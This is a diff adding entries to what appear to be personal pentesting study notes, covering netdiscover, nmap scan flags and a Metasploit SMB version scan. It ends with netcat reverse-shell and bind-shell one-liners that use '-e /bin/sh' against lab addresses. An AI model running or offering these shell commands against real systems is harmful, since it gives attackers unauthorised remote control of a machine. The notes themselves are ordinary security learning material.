@@ -16,3 +16,30 @@ cut -d " " -f 4
 whatweb - Kali cli tool for identifying site ( better than most)
 Wappalyzer - extension on browser
 
+### netdiscover - arp in the network
+
+netdiscover -r 192.168.88.0/24
+
+### nmap
+-sS - "Stealh scan" (not really , just syn, synack and RST - no sessions established) 
+nmap -sS 192.168.88.128
+nmap -T4 -p- -A
+-p- - all ports  ( default is top 1000 ports) ;   -A - scan everything , version, OS, fingerprint
+
+### SMB
+
+msfconsole
+search smb 
+use auxiliary/scanner/smb/smb_version 
+set RHOSTS 192.168.88.128
+run
+
+### nice to knows 
+dpkg -i downloaded_package.deb  # install a package
+
+### reverse shell ( just like pentestmonkey )
+nc 192.168.1.1 4444 -e /bin/sh        --->   nc -lvp 4444
+
+### bind shell 
+nc 192.168.1.1 4444     ---->  nc -lvp 4444 -e /bin/sh
+
